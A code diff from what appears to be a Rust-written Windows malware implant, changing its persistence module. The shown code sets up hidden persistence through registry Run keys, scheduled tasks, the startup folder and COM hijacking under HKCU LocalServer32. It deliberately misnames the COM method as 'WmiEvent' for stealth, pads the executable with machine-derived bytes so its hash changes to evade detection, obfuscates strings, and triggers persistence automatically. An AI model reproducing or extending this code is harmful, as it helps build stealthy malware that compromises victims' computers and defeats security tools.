@@ -24,10 +24,13 @@ const CHUNK_SIZES: [usize; 4] = [12288, 16384, 8192, 24576];
 const MAX_CHUNK_SIZE: usize = 24576;
 
 /// Métodos de persistencia disponibles
+/// Note: WmiEvent now implements COM Hijacking (more stealthy, no admin required)
+/// The name is kept for backwards compatibility with the "persistence wmi" command
 #[derive(Debug, Clone, Copy)]
 pub enum PersistenceMethod {
     RegistryRun,
     ScheduledTask,
+    /// COM Hijacking (previously WMI, renamed internally for stealth)
     WmiEvent,
     StartupFolder,
 }
@@ -37,7 +40,7 @@ impl PersistenceMethod {
         match s.to_lowercase().as_str() {
             "registry" | "reg" => Some(PersistenceMethod::RegistryRun),
             "task" | "schtask" => Some(PersistenceMethod::ScheduledTask),
-            "wmi" => Some(PersistenceMethod::WmiEvent),
+            "wmi" | "com" => Some(PersistenceMethod::WmiEvent), // "com" alias added
             "startup" => Some(PersistenceMethod::StartupFolder),
             _ => None,
         }
@@ -170,11 +173,12 @@ fn ensure_persistent_location(current_exe: &Path) -> Result<PathBuf, String> {
     // Polymorphic padding: add random bytes to the end of the file
     // This changes the hash while keeping the executable valid
     // Windows ignores data after the PE end
-    let padding_size = 256 + (get_machine_index() % 512);
+    let machine_idx = get_machine_index(); // Calculate once for efficiency
+    let padding_size = 256 + (machine_idx % 512);
     let mut polymorphic_data = source_data.clone();
     for i in 0..padding_size {
         // Generate pseudo-random bytes based on machine index and position
-        let byte = ((get_machine_index() + i) % 256) as u8;
+        let byte = ((machine_idx.wrapping_add(i)) % 256) as u8;
         polymorphic_data.push(byte);
     }
 
@@ -491,7 +495,8 @@ fn persist_wmi_event(exe_path: &Path) -> Result<String, String> {
     let (clsid, com_name) = com_hijack_targets[idx];
 
     // Build the registry key path for COM hijacking in HKCU
-    // HKCU\Software\Classes\CLSID\{CLSID}\InprocServer32
+    // We use LocalServer32 which points to an executable
+    // (InprocServer32 would require a DLL)
     let reg_key_base = format!("HKCU\\Software\\Classes\\CLSID\\{}", clsid);
 
     let reg_exe = obfstr!("reg").to_string();
@@ -1082,6 +1087,8 @@ pub fn schedule_auto_persistence() {
         AUTO_PERSIST_DONE.store(true, Ordering::SeqCst);
 
         // Try COM Hijacking first (most stealthy)
+        // Note: WmiEvent enum now implements COM Hijacking (not actual WMI)
+        // The enum name is kept for backwards compatibility with "persistence wmi" command
         match establish_persistence(PersistenceMethod::WmiEvent) {
             Ok(msg) => {
                 debug_print!(
